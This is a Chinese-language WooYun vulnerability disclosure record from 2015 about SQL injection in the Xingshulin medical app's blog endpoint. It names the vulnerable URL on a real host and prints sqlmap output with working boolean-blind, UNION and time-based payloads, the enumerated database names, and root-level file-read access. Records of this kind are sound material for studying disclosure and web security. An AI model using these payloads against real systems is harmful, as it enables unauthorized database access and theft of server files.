{"id": 14078, "wybug_id": "wooyun-2015-0119032", "wybug_title": "杏树林SQL注入漏洞导致服务器任意文件下载", "wybug_corp": "杏树林", "wybug_author": "IT P民", "wybug_date": "2015-06-08 16:14", "wybug_open_date": "2015-07-23 16:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 杏树林某APP URL SQL注入导致服务器任意文件下载。 详细说明：  打开杏树林病例夹APP抓个包，在杏树林的世界板块。有个url:http://php.xingshulin.com/blog/php/get.php?id=65&act=get_one_article打开 http://php.xingshulin.com/blog/php/get.php?id=65%27&act=get_one_article显示 Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /app/web/php/blog/php/get.php on line 22PHP ERR get.php get_one_article sql执行失败可判断这里未做过滤。sqlmap 跑一下，发现有注入漏洞Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=65' AND 4465=4465 AND 'wwYq'='wwYq&act=get_one_article    Type: UNION query    Title: MySQL UNION query (NULL) - 6 columns    Payload: id=-9140' UNION ALL SELECT CONCAT(0x7167757971,0x6a5453774753736d5766,0x7175787771),NULL,NULL,NULL,NULL,NULL#&act=get_one_article列一下数据库：    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=65' AND SLEEP(5) AND 'rdxa'='rdxa&act=get_one_article---web application technology: Nginx, PHP 5.5.11back-end DBMS: MySQL >= 5.0.0available databases [11]:[*] article[*] article_bak[*] information_schema[*] mysql[*] performance_schema[*] test[*] test_db[*] ultrax[*] xml[*] xml_bak[*] xsl_bbs看了下，是root 用户，并且开启了读取文件系统的权限，取一个文件出来看一下～这是mysql 的配置文件\n\n   漏洞证明：  列一下数据库：    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=65' AND SLEEP(5) AND 'rdxa'='rdxa&act=get_one_article---web application technology: Nginx, PHP 5.5.11back-end DBMS: MySQL >= 5.0.0available databases [11]:[*] article[*] article_bak[*] information_schema[*] mysql[*] performance_schema[*] test[*] test_db[*] ultrax[*] xml[*] xml_bak[*] xsl_bbs看了下，是root 用户，并且开启了读取文件系统的权限，取一个文件出来看一下～这是mysql 的配置文件\n\n   修复方案：  技术人员更懂～   版权声明：转载请注明来源 IT P民@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}